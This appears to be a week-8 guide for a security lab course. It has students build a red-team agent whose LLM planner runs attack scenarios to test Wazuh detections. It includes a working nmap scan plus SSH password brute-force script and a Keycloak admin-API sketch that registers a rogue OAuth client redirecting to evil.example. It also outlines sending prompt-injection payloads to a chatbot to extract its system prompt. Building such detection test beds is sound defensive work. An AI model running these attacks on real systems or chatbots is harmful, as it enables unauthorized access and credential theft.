# Week 8 — Red-Team Agent

## Objectives

- All 8 scenario stubs (`agent/redteam/scenarios/`) become real executions
- `python -m redteam.main run --scenario X` works for at least 4 of them
- The LLM planner (`plan --rounds N`) produces valid `RedTeamPlan` JSON
- Each run appends to `ground_truth.jsonl`

## Starting point

The skeleton ships `mfa_fatigue.py` fully fleshed. Other 7 are stubs that return `outcome: "skipped"`. This week, flesh out four more:

### Pick four to implement this week

Recommended (easiest → hardest):

1. `port_scan_then_ssh_bf` — pure shell, no Keycloak/OAuth knowledge
2. `chatbot_prompt_injection` — HTTP POST to Sage with payload strings
3. `oauth_consent_grant` — Keycloak admin API to create a malicious client
4. `priv_role_burst` — Keycloak admin API to assign/revoke roles fast

Defer for week 11:
- `helpdesk_password_reset` (needs the Sage agent to know about a "helpdesk" persona)
- `sp_credential_addition` (needs service accounts which week 11 introduces)
- `cloud_storage_exfil` (needs Sage's data endpoint, week 11)

## Per-scenario pattern

Each scenario module exports a `run(params: dict) -> dict` function. The return shape must match the keys the registry expects: `outcome`, `target`, `mitre_techniques`, `expected_alerts`, optional `notes`.

The function does the *actual* attack. It returns metadata about what it did. The CLI in `redteam/main.py` wraps the result in a `GroundTruthEntry` and persists it.

## Saturday — implement 2 simple ones

`port_scan_then_ssh_bf`:

```python
import subprocess

def run(params):
    target = params.get("target_host", "127.0.0.1")
    # 1. Port scan
    nmap_result = subprocess.run(
        ["nmap", "-Pn", "-p", "22,80,443,3389,5432", target],
        capture_output=True, text=True, timeout=60,
    )
    # 2. SSH brute force (against a non-existent user)
    bf_attempts = 0
    for password in ["123456", "password", "admin", "letmein", "qwerty"]:
        r = subprocess.run(
            ["sshpass", "-p", password,
             "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=2",
             f"baduser@{target}", "echo test"],
            capture_output=True, timeout=10,
        )
        bf_attempts += 1
        if r.returncode == 0:
            break
    return {
        "outcome": "executed" if bf_attempts > 0 else "error",
        "target": target,
        "mitre_techniques": ["T1595.001", "T1110.001"],
        "expected_alerts": ["ouroboros-host-ssh-bf-v1"],
        "notes": f"nmap_rc={nmap_result.returncode} bf_attempts={bf_attempts}",
    }
```

`chatbot_prompt_injection`: send a batch of well-known injection payloads to Sage and check responses for system-prompt leakage.

## Sunday — Keycloak admin API scenarios

`oauth_consent_grant` (sketch):

```python
import httpx
from agent.common.openrouter import OpenRouterClient

def _get_admin_token(kc_url, realm, user, pw):
    r = httpx.post(
        f"{kc_url}/realms/master/protocol/openid-connect/token",
        data={
            "grant_type": "password",
            "client_id": "admin-cli",
            "username": user, "password": pw,
        },
    )
    return r.json()["access_token"]

def run(params):
    token = _get_admin_token(...)
    # Create a malicious client
    r = httpx.post(
        f"{kc_url}/admin/realms/halcyon-care/clients",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "clientId": params.get("client_id", "definitely-not-malicious"),
            "publicClient": False,
            "redirectUris": ["https://evil.example/callback"],
            "directAccessGrantsEnabled": True,
        },
    )
    return {
        "outcome": "executed" if r.status_code == 201 else "error",
        "target": "keycloak:halcyon-care",
        "mitre_techniques": ["T1550.001", "T1098.003"],
        "expected_alerts": ["ouroboros-keycloak-oauth-client-create-v1"],
    }
```

## Test the planner

```bash
make agent-redteam-plan
# or:
python -m redteam.main plan --rounds 1
```

The planner reads recent triage results, picks scenarios, and runs them. With no triage history yet, it'll pick semi-randomly — that's fine.

## Done conditions

- [ ] At least 4 scenarios execute real attack steps (not stubs)
- [ ] `ground_truth.jsonl` has rows from each
- [ ] `python -m redteam.main plan --rounds 1` runs end-to-end and chooses scenarios
- [ ] At least one corresponding Wazuh alert fires in response

## Pitfalls

- **Hard-coded localhost.** Always read target hosts from `params` with env-var defaults. Lets the planner override per-round.
- **Forgetting to log outcome="error".** If a scenario raises, the wrapper handles it — but if a scenario silently no-ops, the row says "executed" with no impact. Always return an honest outcome.
